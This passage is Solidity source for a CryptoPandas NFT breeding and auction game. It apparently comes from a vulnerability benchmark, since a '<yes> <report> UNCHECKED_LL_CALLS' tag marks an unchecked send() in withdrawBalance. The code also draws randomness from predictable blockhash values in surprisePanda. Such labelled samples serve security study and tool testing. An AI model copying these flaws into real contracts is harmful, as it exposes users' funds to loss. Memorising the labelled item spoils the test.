price;\n\n        // Return the funds. Similar to the previous transfer, this is\n        // not susceptible to a re-entry attack because the auction is\n        // removed before any transfers occur.\n        msg.sender.transfer(bidExcess);\n\n        // Tell the world!\n        AuctionSuccessful(_tokenId, price, msg.sender);\n\n        return price;\n    }\n\n\n\n    /// @dev Removes an auction from the list of open auctions.\n    /// @param _tokenId - ID of NFT on auction.\n    function _removeAuction(uint256 _tokenId) internal {\n        delete tokenIdToAuction[_tokenId];\n    }\n\n    /// @dev Returns true if the NFT is on auction.\n    /// @param _auction - Auction to check.\n    function _isOnAuction(Auction storage _auction) internal view returns (bool) {\n        return (_auction.startedAt > 0);\n    }\n\n    /// @dev Returns current price of an NFT on auction. Broken into two\n    ///  functions (this one, that computes the duration from the auction\n    ///  structure, and the other that does the price computation) so we\n    ///  can easily test that the price computation works correctly.\n    function _currentPrice(Auction storage _auction)\n        internal\n        view\n        returns (uint256)\n    {\n        uint256 secondsPassed = 0;\n\n        // A bit of insurance against negative values (or wraparound).\n        // Probably not necessary (since Ethereum guarnatees that the\n        // now variable doesn't ever go backwards).\n        if (now > _auction.startedAt) {\n            secondsPassed = now - _auction.startedAt;\n        }\n\n        return _computeCurrentPrice(\n            _auction.startingPrice,\n            _auction.endingPrice,\n            _auction.duration,\n            secondsPassed\n        );\n    }\n\n    /// @dev Computes the current price of an auction. Factored out\n    ///  from _currentPrice so we can run extensive unit tests.\n    ///  When testing, make this function public and turn on\n    ///  `Current price computation` test suite.\n    function _computeCurrentPrice(\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration,\n        uint256 _secondsPassed\n    )\n        internal\n        pure\n        returns (uint256)\n    {\n        // NOTE: We don't use SafeMath (or similar) in this function because\n        //  all of our public functions carefully cap the maximum values for\n        //  time (at 64-bits) and currency (at 128-bits). _duration is\n        //  also known to be non-zero (see the require() statement in\n        //  _addAuction())\n        if (_secondsPassed >= _duration) {\n            // We've reached the end of the dynamic pricing portion\n            // of the auction, just return the end price.\n            return _endingPrice;\n        } else {\n            // Starting price can be higher than ending price (and often is!), so\n            // this delta can be negative.\n            int256 totalPriceChange = int256(_endingPrice) - int256(_startingPrice);\n\n            // This multiplication can't overflow, _secondsPassed will easily fit within\n            // 64-bits, and totalPriceChange will easily fit within 128-bits, their product\n            // will always fit within 256-bits.\n            int256 currentPriceChange = totalPriceChange * int256(_secondsPassed) / int256(_duration);\n\n            // currentPriceChange can be negative, but if so, will have a magnitude\n            // less that _startingPrice. Thus, this result will always end up positive.\n            int256 currentPrice = int256(_startingPrice) + currentPriceChange;\n\n            return uint256(currentPrice);\n        }\n    }\n\n    /// @dev Computes owner's cut of a sale.\n    /// @param _price - Sale price of NFT.\n    function _computeCut(uint256 _price) internal view returns (uint256) {\n        // NOTE: We don't use SafeMath (or similar) in this function because\n        //  all of our entry functions carefully cap the maximum values for\n        //  currency (at 128-bits), and ownerCut <= 10000 (see the require()\n        //  statement in the ClockAuction constructor). The result of this\n        //  function is always guaranteed to be <= _price.\n        return _price * ownerCut / 10000;\n    }\n\n}\n\n\n\n\n/**\n * @title Pausable\n * @dev Base contract which allows children to implement an emergency stop mechanism.\n */\ncontract Pausable is Ownable {\n  event Pause();\n  event Unpause();\n\n  bool public paused = false;\n\n\n  /**\n   * @dev modifier to allow actions only when the contract IS paused\n   */\n  modifier whenNotPaused() {\n    require(!paused);\n    _;\n  }\n\n  /**\n   * @dev modifier to allow actions only when the contract IS NOT paused\n   */\n  modifier whenPaused {\n    require(paused);\n    _;\n  }\n\n  /**\n   * @dev called by the owner to pause, triggers stopped state\n   */\n  function pause() onlyOwner whenNotPaused returns (bool) {\n    paused = true;\n    Pause();\n    return true;\n  }\n\n  /**\n   * @dev called by the owner to unpause, returns to normal state\n   */\n  function unpause() onlyOwner whenPaused returns (bool) {\n    paused = false;\n    Unpause();\n    return true;\n  }\n}\n\n\n/// @title Clock auction for non-fungible tokens.\n/// @notice We omit a fallback function to prevent accidental sends to this contract.\ncontract ClockAuction is Pausable, ClockAuctionBase {\n\n    /// @dev The ERC-165 interface signature for ERC-721.\n    ///  Ref: https://github.com/ethereum/EIPs/issues/165\n    ///  Ref: https://github.com/ethereum/EIPs/issues/721\n    bytes4 constant InterfaceSignature_ERC721 = bytes4(0x9a20483d);\n\n    /// @dev Constructor creates a reference to the NFT ownership contract\n    ///  and verifies the owner cut is in the valid range.\n    /// @param _nftAddress - address of a deployed contract implementing\n    ///  the Nonfungible Interface.\n    /// @param _cut - percent cut the owner takes on each auction, must be\n    ///  between 0-10,000.\n    function ClockAuction(address _nftAddress, uint256 _cut) public {\n        require(_cut <= 10000);\n        ownerCut = _cut;\n\n        ERC721 candidateContract = ERC721(_nftAddress);\n        require(candidateContract.supportsInterface(InterfaceSignature_ERC721));\n        nonFungibleContract = candidateContract;\n    }\n\n    /// @dev Remove all Ether from the contract, which is the owner's cuts\n    ///  as well as any Ether sent directly to the contract address.\n    ///  Always transfers to the NFT contract, but can be called either by\n    ///  the owner or the NFT contract.\n    function withdrawBalance() external {\n        address nftAddress = address(nonFungibleContract);\n\n        require(\n            msg.sender == owner ||\n            msg.sender == nftAddress\n        );\n        // We are using this boolean method to make sure that even if one fails it will still work\n        // <yes> <report> UNCHECKED_LL_CALLS\n        bool res = nftAddress.send(this.balance);\n    }\n\n    /// @dev Creates and begins a new auction.\n    /// @param _tokenId - ID of token to auction, sender must be owner.\n    /// @param _startingPrice - Price of item (in wei) at beginning of auction.\n    /// @param _endingPrice - Price of item (in wei) at end of auction.\n    /// @param _duration - Length of time to move between starting\n    ///  price and ending price (in seconds).\n    /// @param _seller - Seller, if not the message sender\n    function createAuction(\n        uint256 _tokenId,\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration,\n        address _seller\n    )\n        external\n        whenNotPaused\n    {\n        // Sanity check that no inputs overflow how many bits we've allocated\n        // to store them in the auction struct.\n        require(_startingPrice == uint256(uint128(_startingPrice)));\n        require(_endingPrice == uint256(uint128(_endingPrice)));\n        require(_duration == uint256(uint64(_duration)));\n\n        require(_owns(msg.sender, _tokenId));\n        _escrow(msg.sender, _tokenId);\n        Auction memory auction = Auction(\n            _seller,\n            uint128(_startingPrice),\n            uint128(_endingPrice),\n            uint64(_duration),\n            uint64(now),\n            0\n        );\n        _addAuction(_tokenId, auction);\n    }\n\n    /// @dev Bids on an open auction, completing the auction and transferring\n    ///  ownership of the NFT if enough Ether is supplied.\n    /// @param _tokenId - ID of token to bid on.\n    function bid(uint256 _tokenId)\n        external\n        payable\n        whenNotPaused\n    {\n        // _bid will throw if the bid or funds transfer fails\n        _bid(_tokenId, msg.value);\n        _transfer(msg.sender, _tokenId);\n    }\n\n    /// @dev Cancels an auction that hasn't been won yet.\n    ///  Returns the NFT to original owner.\n    /// @notice This is a state-modifying function that can\n    ///  be called while the contract is paused.\n    /// @param _tokenId - ID of token on auction\n    function cancelAuction(uint256 _tokenId)\n        external\n    {\n        Auction storage auction = tokenIdToAuction[_tokenId];\n        require(_isOnAuction(auction));\n        address seller = auction.seller;\n        require(msg.sender == seller);\n        _cancelAuction(_tokenId, seller);\n    }\n\n    /// @dev Cancels an auction when the contract is paused.\n    ///  Only the owner may do this, and NFTs are returned to\n    ///  the seller. This should only be used in emergencies.\n    /// @param _tokenId - ID of the NFT on auction to cancel.\n    function cancelAuctionWhenPaused(uint256 _tokenId)\n        whenPaused\n        onlyOwner\n        external\n    {\n        Auction storage auction = tokenIdToAuction[_tokenId];\n        require(_isOnAuction(auction));\n        _cancelAuction(_tokenId, auction.seller);\n    }\n\n    /// @dev Returns auction info for an NFT on auction.\n    /// @param _tokenId - ID of NFT on auction.\n    function getAuction(uint256 _tokenId)\n        external\n        view\n        returns\n    (\n        address seller,\n        uint256 startingPrice,\n        uint256 endingPrice,\n        uint256 duration,\n        uint256 startedAt\n    ) {\n        Auction storage auction = tokenIdToAuction[_tokenId];\n        require(_isOnAuction(auction));\n        return (\n            auction.seller,\n            auction.startingPrice,\n            auction.endingPrice,\n            auction.duration,\n            auction.startedAt\n        );\n    }\n\n    /// @dev Returns the current price of an auction.\n    /// @param _tokenId - ID of the token price we are checking.\n    function getCurrentPrice(uint256 _tokenId)\n        external\n        view\n        returns (uint256)\n    {\n        Auction storage auction = tokenIdToAuction[_tokenId];\n        require(_isOnAuction(auction));\n        return _currentPrice(auction);\n    }\n\n}\n\n\n\n\n/// @title Reverse auction modified for siring\n/// @notice We omit a fallback function to prevent accidental sends to this contract.\ncontract SiringClockAuction is ClockAuction {\n\n    // @dev Sanity check that allows us to ensure that we are pointing to the\n    //  right auction in our setSiringAuctionAddress() call.\n    bool public isSiringClockAuction = true;\n\n    // Delegate constructor\n    function SiringClockAuction(address _nftAddr, uint256 _cut) public\n        ClockAuction(_nftAddr, _cut) {}\n\n    /// @dev Creates and begins a new auction. Since this function is wrapped,\n    /// require sender to be PandaCore contract.\n    /// @param _tokenId - ID of token to auction, sender must be owner.\n    /// @param _startingPrice - Price of item (in wei) at beginning of auction.\n    /// @param _endingPrice - Price of item (in wei) at end of auction.\n    /// @param _duration - Length of auction (in seconds).\n    /// @param _seller - Seller, if not the message sender\n    function createAuction(\n        uint256 _tokenId,\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration,\n        address _seller\n    )\n        external\n    {\n        // Sanity check that no inputs overflow how many bits we've allocated\n        // to store them in the auction struct.\n        require(_startingPrice == uint256(uint128(_startingPrice)));\n        require(_endingPrice == uint256(uint128(_endingPrice)));\n        require(_duration == uint256(uint64(_duration)));\n\n        require(msg.sender == address(nonFungibleContract));\n        _escrow(_seller, _tokenId);\n        Auction memory auction = Auction(\n            _seller,\n            uint128(_startingPrice),\n            uint128(_endingPrice),\n            uint64(_duration),\n            uint64(now),\n            0\n        );\n        _addAuction(_tokenId, auction);\n    }\n\n    /// @dev Places a bid for siring. Requires the sender\n    /// is the PandaCore contract because all bid methods\n    /// should be wrapped. Also returns the panda to the\n    /// seller rather than the winner.\n    function bid(uint256 _tokenId)\n        external\n        payable\n    {\n        require(msg.sender == address(nonFungibleContract));\n        address seller = tokenIdToAuction[_tokenId].seller;\n        // _bid checks that token ID is valid and will throw if bid fails\n        _bid(_tokenId, msg.value);\n        // We transfer the panda back to the seller, the winner will get\n        // the offspring\n        _transfer(seller, _tokenId);\n    }\n\n}\n\n\n\n\n/// @title Clock auction modified for sale of pandas\n/// @notice We omit a fallback function to prevent accidental sends to this contract.\ncontract SaleClockAuction is ClockAuction {\n\n    // @dev Sanity check that allows us to ensure that we are pointing to the\n    //  right auction in our setSaleAuctionAddress() call.\n    bool public isSaleClockAuction = true;\n\n    // Tracks last 5 sale price of gen0 panda sales\n    uint256 public gen0SaleCount;\n    uint256[5] public lastGen0SalePrices;\n    uint256 public constant SurpriseValue = 10 finney;\n\n    uint256[] CommonPanda;\n    uint256[] RarePanda;\n    uint256   CommonPandaIndex;\n    uint256   RarePandaIndex;\n\n    // Delegate constructor\n    function SaleClockAuction(address _nftAddr, uint256 _cut) public\n        ClockAuction(_nftAddr, _cut) {\n            CommonPandaIndex = 1;\n            RarePandaIndex   = 1;\n    }\n\n    /// @dev Creates and begins a new auction.\n    /// @param _tokenId - ID of token to auction, sender must be owner.\n    /// @param _startingPrice - Price of item (in wei) at beginning of auction.\n    /// @param _endingPrice - Price of item (in wei) at end of auction.\n    /// @param _duration - Length of auction (in seconds).\n    /// @param _seller - Seller, if not the message sender\n    function createAuction(\n        uint256 _tokenId,\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration,\n        address _seller\n    )\n        external\n    {\n        // Sanity check that no inputs overflow how many bits we've allocated\n        // to store them in the auction struct.\n        require(_startingPrice == uint256(uint128(_startingPrice)));\n        require(_endingPrice == uint256(uint128(_endingPrice)));\n        require(_duration == uint256(uint64(_duration)));\n\n        require(msg.sender == address(nonFungibleContract));\n        _escrow(_seller, _tokenId);\n        Auction memory auction = Auction(\n            _seller,\n            uint128(_startingPrice),\n            uint128(_endingPrice),\n            uint64(_duration),\n            uint64(now),\n            0\n        );\n        _addAuction(_tokenId, auction);\n    }\n\n    function createGen0Auction(\n        uint256 _tokenId,\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration,\n        address _seller\n    )\n        external\n    {\n        // Sanity check that no inputs overflow how many bits we've allocated\n        // to store them in the auction struct.\n        require(_startingPrice == uint256(uint128(_startingPrice)));\n        require(_endingPrice == uint256(uint128(_endingPrice)));\n        require(_duration == uint256(uint64(_duration)));\n\n        require(msg.sender == address(nonFungibleContract));\n        _escrow(_seller, _tokenId);\n        Auction memory auction = Auction(\n            _seller,\n            uint128(_startingPrice),\n            uint128(_endingPrice),\n            uint64(_duration),\n            uint64(now),\n            1\n        );\n        _addAuction(_tokenId, auction);\n    }    \n\n    /// @dev Updates lastSalePrice if seller is the nft contract\n    /// Otherwise, works the same as default bid method.\n    function bid(uint256 _tokenId)\n        external\n        payable\n    {\n        // _bid verifies token ID size\n        uint64 isGen0 = tokenIdToAuction[_tokenId].isGen0;\n        uint256 price = _bid(_tokenId, msg.value);\n        _transfer(msg.sender, _tokenId);\n\n        // If not a gen0 auction, exit\n        if (isGen0 == 1) {\n            // Track gen0 sale prices\n            lastGen0SalePrices[gen0SaleCount % 5] = price;\n            gen0SaleCount++;\n        }\n    }\n\n    function createPanda(uint256 _tokenId,uint256 _type)\n        external\n    {\n        require(msg.sender == address(nonFungibleContract));\n        if (_type == 0) {\n            CommonPanda.push(_tokenId);\n        }else {\n            RarePanda.push(_tokenId);\n        }\n    }\n\n    function surprisePanda()\n        external\n        payable\n    {\n        bytes32 bHash = keccak256(block.blockhash(block.number),block.blockhash(block.number-1));\n        uint256 PandaIndex;\n        if (bHash[25] > 0xC8) {\n            require(uint256(RarePanda.length) >= RarePandaIndex);\n            PandaIndex = RarePandaIndex;\n            RarePandaIndex ++;\n\n        } else{\n            require(uint256(CommonPanda.length) >= CommonPandaIndex);\n            PandaIndex = CommonPandaIndex;\n            CommonPandaIndex ++;\n        }\n        _transfer(msg.sender,PandaIndex);\n    }\n\n    function packageCount() external view returns(uint256 common,uint256 surprise) {\n        common   = CommonPanda.length + 1 - CommonPandaIndex;\n        surprise = RarePanda.length + 1 - RarePandaIndex;\n    }\n\n    function averageGen0SalePrice() external view returns (uint256) {\n        uint256 sum = 0;\n        for (uint256 i = 0; i < 5; i++) {\n            sum += lastGen0SalePrices[i];\n        }\n        return sum / 5;\n    }\n\n}\n\n\n\n/// @title Clock auction modified for sale of pandas\n/// @notice We omit a fallback function to prevent accidental sends to this contract.\ncontract SaleClockAuctionERC20 is ClockAuction {\n\n\n    event AuctionERC20Created(uint256 tokenId, uint256 startingPrice, uint256 endingPrice, uint256 duration, address erc20Contract);\n\n    // @dev Sanity check that allows us to ensure that we are pointing to the\n    //  right auction in our setSaleAuctionAddress() call.\n    bool public isSaleClockAuctionERC20 = true;\n\n    mapping (uint256 => address) public tokenIdToErc20Address;\n\n    mapping (address => uint256) public erc20ContractsSwitcher;\n\n    mapping (address => uint256) public balances;\n    \n    // Delegate constructor\n    function SaleClockAuctionERC20(address _nftAddr, uint256 _cut) public\n        ClockAuction(_nftAddr, _cut) {}\n\n    function erc20ContractSwitch(address _erc20address, uint256 _onoff) external{\n        require (msg.sender == address(nonFungibleContract));\n\n        require (_erc20address != address(0));\n\n        erc20ContractsSwitcher[_erc20address] = _onoff;\n    }\n    /// @dev Creates and begins a new auction.\n    /// @param _tokenId - ID of token to auction, sender must be owner.\n    /// @param _startingPrice - Price of item (in wei) at beginning of auction.\n    /// @param _endingPrice - Price of item (in wei) at end of auction.\n    /// @param _duration - Length of auction (in seconds).\n    /// @param _seller - Seller, if not the message sender\n    function createAuction(\n        uint256 _tokenId,\n        address _erc20Address,\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration,\n        address _seller\n    )\n        external\n    {\n        // Sanity check that no inputs overflow how many bits we've allocated\n        // to store them in the auction struct.\n        require(_startingPrice == uint256(uint128(_startingPrice)));\n        require(_endingPrice == uint256(uint128(_endingPrice)));\n        require(_duration == uint256(uint64(_duration)));\n\n        require(msg.sender == address(nonFungibleContract));\n\n        require (erc20ContractsSwitcher[_erc20Address] > 0);\n        \n        _escrow(_seller, _tokenId);\n        Auction memory auction = Auction(\n            _seller,\n            uint128(_startingPrice),\n            uint128(_endingPrice),\n            uint64(_duration),\n            uint64(now),\n            0\n        );\n        _addAuctionERC20(_tokenId, auction, _erc20Address);\n        tokenIdToErc20Address[_tokenId] = _erc20Address;\n    }\n\n    /// @dev Adds an auction to the list of open auctions. Also fires the\n    ///  AuctionCreated event.\n    /// @param _tokenId The ID of the token to be put on auction.\n    /// @param _auction Auction to add.\n    function _addAuctionERC20(uint256 _tokenId, Auction _auction, address _erc20address) internal {\n        // Require that all auctions have a duration of\n        // at least one minute. (Keeps our math from getting hairy!)\n        require(_auction.duration >= 1 minutes);\n\n        tokenIdToAuction[_tokenId] = _auction;\n\n        AuctionERC20Created(\n            uint256(_tokenId),\n            uint256(_auction.startingPrice),\n            uint256(_auction.endingPrice),\n            uint256(_auction.duration),\n            _erc20address\n        );\n    }   \n\n    function bid(uint256 _tokenId)\n        external\n        payable{\n            // do nothing\n    }\n\n    /// @dev Updates lastSalePrice if seller is the nft contract\n    /// Otherwise, works the same as default bid method.\n    function bidERC20(uint256 _tokenId,uint256 _amount)\n        external\n    {\n        // _bid verifies token ID size\n        address seller = tokenIdToAuction[_tokenId].seller;\n        address _erc20address = tokenIdToErc20Address[_tokenId];\n        require (_erc20address != address(0));\n        uint256 price = _bidERC20(_erc20address,msg.sender,_tokenId, _amount);\n        _transfer(msg.sender, _tokenId);\n        delete tokenIdToErc20Address[_tokenId];\n    }\n\n    function cancelAuction(uint256 _tokenId)\n        external\n    {\n        Auction storage auction = tokenIdToAuction[_tokenId];\n        require(_isOnAuction(auction));\n        address seller = auction.seller;\n        require(msg.sender == seller);\n        _cancelAuction(_tokenId, seller);\n        delete tokenIdToErc20Address[_tokenId];\n    }\n\n    function withdrawERC20Balance(address _erc20Address, address _to) external returns(bool res)  {\n        require (balances[_erc20Address] > 0);\n        require(msg.sender == address(nonFungibleContract));\n        ERC20(_erc20Address).transfer(_to, balances[_erc20Address]);\n    }\n    \n    /// @dev Computes the price and transfers winnings.\n    /// Does NOT transfer ownership of token.\n    function _bidERC20(address _erc20Address,address _buyerAddress, uint256 _tokenId, uint256 _bidAmount)\n        internal\n        returns (uint256)\n    {\n        // Get a reference to the auction struct\n        Auction storage auction = tokenIdToAuction[_tokenId];\n\n        // Explicitly check that this auction is currently live.\n        // (Because of how Ethereum mappings work, we can't just count\n        // on the lookup above failing. An invalid _tokenId will just\n        // return an auction object that is all zeros.)\n        require(_isOnAuction(auction));\n\n\n        require (_erc20Address != address(0) && _erc20Address == tokenIdToErc20Address[_tokenId]);\n        \n\n        // Check that the bid is greater than or equal to the current price\n        uint256 price = _currentPrice(auction);\n        require(_bidAmount >= price);\n\n        // Grab a reference to the seller before the auction struct\n        // gets deleted.\n        address seller = auction.seller;\n\n        // The bid is good! Remove the auction before sending the fees\n        // to the sender so we can't have a reentrancy attack.\n        _removeAuction(_tokenId);\n\n        // Transfer proceeds to seller (if there are any!)\n        if (price > 0) {\n            // Calculate the auctioneer's cut.\n            // (NOTE: _computeCut() is guaranteed to return a\n            // value <= price, so this subtraction can't go negative.)\n            uint256 auctioneerCut = _computeCut(price);\n            uint256 sellerProceeds = price - auctioneerCut;\n\n            // Send Erc20 Token to seller should call Erc20 contract\n            // Reference to contract\n            require(ERC20(_erc20Address).transferFrom(_buyerAddress,seller,sellerProceeds));\n            if (auctioneerCut > 0){\n                require(ERC20(_erc20Address).transferFrom(_buyerAddress,address(this),auctioneerCut));\n                balances[_erc20Address] += auctioneerCut;\n            }\n        }\n\n        // Tell the world!\n        AuctionSuccessful(_tokenId, price, msg.sender);\n\n        return price;\n    }\n}\n\n\n/// @title Handles creating auctions for sale and siring of pandas.\n///  This wrapper of ReverseAuction exists only so that users can create\n///  auctions with only one transaction.\ncontract PandaAuction is PandaBreeding {\n\n    // @notice The auction contract variables are defined in PandaBase to allow\n    //  us to refer to them in PandaOwnership to prevent accidental transfers.\n    // `saleAuction` refers to the auction for gen0 and p2p sale of pandas.\n    // `siringAuction` refers to the auction for siring rights of pandas.\n\n    /// @dev Sets the reference to the sale auction.\n    /// @param _address - Address of sale contract.\n    function setSaleAuctionAddress(address _address) external onlyCEO {\n        SaleClockAuction candidateContract = SaleClockAuction(_address);\n\n        // NOTE: verify that a contract is what we expect - https://github.com/Lunyr/crowdsale-contracts/blob/cfadd15986c30521d8ba7d5b6f57b4fefcc7ac38/contracts/LunyrToken.sol#L117\n        require(candidateContract.isSaleClockAuction());\n\n        // Set the new contract address\n        saleAuction = candidateContract;\n    }\n\n    function setSaleAuctionERC20Address(address _address) external onlyCEO {\n        SaleClockAuctionERC20 candidateContract = SaleClockAuctionERC20(_address);\n\n        // NOTE: verify that a contract is what we expect - https://github.com/Lunyr/crowdsale-contracts/blob/cfadd15986c30521d8ba7d5b6f57b4fefcc7ac38/contracts/LunyrToken.sol#L117\n        require(candidateContract.isSaleClockAuctionERC20());\n\n        // Set the new contract address\n        saleAuctionERC20 = candidateContract;\n    }\n\n    /// @dev Sets the reference to the siring auction.\n    /// @param _address - Address of siring contract.\n    function setSiringAuctionAddress(address _address) external onlyCEO {\n        SiringClockAuction candidateContract = SiringClockAuction(_address);\n\n        // NOTE: verify that a contract is what we expect - https://github.com/Lunyr/crowdsale-contracts/blob/cfadd15986c30521d8ba7d5b6f57b4fefcc7ac38/contracts/LunyrToken.sol#L117\n        require(candidateContract.isSiringClockAuction());\n\n        // Set the new contract address\n        siringAuction = candidateContract;\n    }\n\n    /// @dev Put a panda up for auction.\n    ///  Does some ownership trickery to create auctions in one tx.\n    function createSaleAuction(\n        uint256 _pandaId,\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration\n    )\n        external\n        whenNotPaused\n    {\n        // Auction contract checks input sizes\n        // If panda is already on any auction, this will throw\n        // because it will be owned by the auction contract.\n        require(_owns(msg.sender, _pandaId));\n        // Ensure the panda is not pregnant to prevent the auction\n        // contract accidentally receiving ownership of the child.\n        // NOTE: the panda IS allowed to be in a cooldown.\n        require(!isPregnant(_pandaId));\n        _approve(_pandaId, saleAuction);\n        // Sale auction throws if inputs are invalid and clears\n        // transfer and sire approval after escrowing the panda.\n        saleAuction.createAuction(\n            _pandaId,\n            _startingPrice,\n            _endingPrice,\n            _duration,\n            msg.sender\n        );\n    }\n\n    /// @dev Put a panda up for auction.\n    ///  Does some ownership trickery to create auctions in one tx.\n    function createSaleAuctionERC20(\n        uint256 _pandaId,\n        address _erc20address,\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration\n    )\n        external\n        whenNotPaused\n    {\n        // Auction contract checks input sizes\n        // If panda is already on any auction, this will throw\n        // because it will be owned by the auction contract.\n        require(_owns(msg.sender, _pandaId));\n        // Ensure the panda is not pregnant to prevent the auction\n        // contract accidentally receiving ownership of the child.\n        // NOTE: the panda IS allowed to be in a cooldown.\n        require(!isPregnant(_pandaId));\n        _approve(_pandaId, saleAuctionERC20);\n        // Sale auction throws if inputs are invalid and clears\n        // transfer and sire approval after escrowing the panda.\n        saleAuctionERC20.createAuction(\n            _pandaId,\n            _erc20address,\n            _startingPrice,\n            _endingPrice,\n            _duration,\n            msg.sender\n        );\n    }\n\n    function switchSaleAuctionERC20For(address _erc20address, uint256 _onoff) external onlyCOO{\n        saleAuctionERC20.erc20ContractSwitch(_erc20address,_onoff);\n    }\n\n\n    /// @dev Put a panda up for auction to be sire.\n    ///  Performs checks to ensure the panda can be sired, then\n    ///  delegates to reverse auction.\n    function createSiringAuction(\n        uint256 _pandaId,\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration\n    )\n        external\n        whenNotPaused\n    {\n        // Auction contract checks input sizes\n        // If panda is already on any auction, this will throw\n        // because it will be owned by the auction contract.\n        require(_owns(msg.sender, _pandaId));\n        require(isReadyToBreed(_pandaId));\n        _approve(_pandaId, siringAuction);\n        // Siring auction throws if inputs are invalid and clears\n        // transfer and sire approval after escrowing the panda.\n        siringAuction.createAuction(\n            _pandaId,\n            _startingPrice,\n            _endingPrice,\n            _duration,\n            msg.sender\n        );\n    }\n\n    /// @dev Completes a siring auction by bidding.\n    ///  Immediately breeds the winning matron with the sire on auction.\n    /// @param _sireId - ID of the sire on auction.\n    /// @param _matronId - ID of the matron owned by the bidder.\n    function bidOnSiringAuction(\n        uint256 _sireId,\n        uint256 _matronId\n    )\n        external\n        payable\n        whenNotPaused\n    {\n        // Auction contract checks input sizes\n        require(_owns(msg.sender, _matronId));\n        require(isReadyToBreed(_matronId));\n        require(_canBreedWithViaAuction(_matronId, _sireId));\n\n        // Define the current price of the auction.\n        uint256 currentPrice = siringAuction.getCurrentPrice(_sireId);\n        require(msg.value >= currentPrice + autoBirthFee);\n\n        // Siring auction will throw if the bid fails.\n        siringAuction.bid.value(msg.value - autoBirthFee)(_sireId);\n        _breedWith(uint32(_matronId), uint32(_sireId), msg.sender);\n    }\n\n    /// @dev Transfers the balance of the sale auction contract\n    /// to the PandaCore contract. We use two-step withdrawal to\n    /// prevent two transfer calls in the auction bid function.\n    function withdrawAuctionBalances() external onlyCLevel {\n        saleAuction.withdrawBalance();\n        siringAuction.withdrawBalance();\n    }\n\n\n    function withdrawERC20Balance(address _erc20Address, address _to) external onlyCLevel {\n        require(saleAuctionERC20 != address(0));\n        saleAuctionERC20.withdrawERC20Balance(_erc20Address,_to);\n    }    \n}\n\n\n\n\n\n/// @title all functions related to creating kittens\ncontract PandaMinting is PandaAuction {\n\n    // Limits the number of cats the contract owner can ever create.\n    //uint256 public constant PROMO_CREATION_LIMIT = 5000;\n    uint256 public constant GEN0_CREATION_LIMIT = 45000;\n\n\n    // Constants for gen0 auctions.\n    uint256 public constant GEN0_STARTING_PRICE = 100 finney;\n    uint256 public constant GEN0_AUCTION_DURATION = 1 days;\n    uint256 public constant OPEN_PACKAGE_PRICE = 10 finney;\n\n\n    // Counts the number of cats the contract owner has created.\n    //uint256 public promoCreatedCount;\n\n\n    /// @dev we can create promo kittens, up to a limit. Only callable by COO\n    /// @param _genes the encoded genes of the kitten to be created, any value is accepted\n    /// @param _owner the future owner of the created kittens. Default to contract COO\n    function createWizzPanda(uint256[2] _genes, uint256 _generation, address _owner) external onlyCOO {\n        address pandaOwner = _owner;\n        if (pandaOwner == address(0)) {\n            pandaOwner = cooAddress;\n        }\n\n        _createPanda(0, 0, _generation, _genes, pandaOwner);\n    }\n\n    /// @dev create pandaWithGenes\n    /// @param _genes panda genes\n    /// @param _type  0 common 1 rare\n    function createPanda(uint256[2] _genes,uint256 _generation,uint256 _type)\n        external\n        payable\n        onlyCOO\n        whenNotPaused\n    {\n        require(msg.value >= OPEN_PACKAGE_PRICE);\n        uint256 kittenId = _createPanda(0, 0, _generation, _genes, saleAuction);\n        saleAuction.createPanda(kittenId,_type);\n    }\n\n    //function buyPandaERC20(address _erc20Address, address _buyerAddress, uint256 _pandaID, uint256 _amount)\n    //external\n    //onlyCOO\n    //whenNotPaused {\n    //    saleAuctionERC20.bid(_erc20Address, _buyerAddress, _pandaID, _amount);\n    //}\n\n    /// @dev Creates a new gen0 panda with the given genes and\n    ///  creates an auction for it.\n    //function createGen0Auction(uint256[2] _genes) external onlyCOO {\n    //    require(gen0CreatedCount < GEN0_CREATION_LIMIT);\n    //\n    //    uint256 pandaId = _createPanda(0, 0, 0, _genes, address(this));\n    //    _approve(pandaId, saleAuction);\n    //\n    //    saleAuction.createAuction(\n    //        pandaId,\n    //        _computeNextGen0Price(),\n    //        0,\n    //        GEN0_AUCTION_DURATION,\n    //        address(this)\n    //    );\n    //\n    //    gen0CreatedCount++;\n    //}\n\n    function createGen0Auction(uint256 _pandaId) external onlyCOO {\n        require(_owns(msg.sender, _pandaId));\n        //require(pandas[_pandaId].generation==1);\n\n        _approve(_pandaId, saleAuction);\n\n        saleAuction.createGen0Auction(\n            _pandaId,\n            _computeNextGen0Price(),\n            0,\n            GEN0_AUCTION_DURATION,\n            msg.sender\n        );\n    }\n\n    /// @dev Computes the next gen0 auction starting price, given\n    ///  the average of the past 5 prices + 50%.\n    function _computeNextGen0Price() internal view returns(uint256) {\n        uint256 avePrice = saleAuction.averageGen0SalePrice();\n\n        // Sanity check to ensure we don't overflow arithmetic\n        require(avePrice == uint256(uint128(avePrice)));\n\n        uint256 nextPrice = avePrice + (avePrice / 2);\n\n        // We never auction for less than starting price\n        if (nextPrice < GEN0_STARTING_PRICE) {\n            nextPrice = GEN0_STARTING_PRICE;\n        }\n\n        return nextPrice;\n    }\n}\n\n\n\n/// @title CryptoPandas: Collectible, breedable, and oh-so-adorable cats on the Ethereum blockchain.\n/// @author Axiom Zen (https://www.axiomzen.co)\n/// @dev The main CryptoPandas contract, keeps track of kittens so they don't wander around and get lost.\ncontract PandaCore is PandaMinting {\n\n    // This is the main CryptoPandas contract. In order to keep our code seperated into logical sections,\n    // we've broken it up in two ways. First, we have several seperately-instantiated sibling contracts\n    // that handle auctions and our super-top-secret genetic combination algorithm. The auctions are\n    // seperate since their logic is somewhat complex and there's always a risk of subtle bugs. By keeping\n    // them in their own contracts, we can upgrade them without disrupting the main contract that tracks\n    // panda ownership. The genetic combination algorithm is kept seperate so we can open-source all of\n    // the rest of our code without making it _too_ easy for folks to figure out how the genetics work.\n    // Don't worry, I'm sure someone will reverse engineer it soon enough!\n    //\n    // Secondly, we break the core contract into multiple files using inheritence, one for each major\n    // facet of functionality of CK. This allows us to keep related code bundled together while still\n    // avoiding a single giant 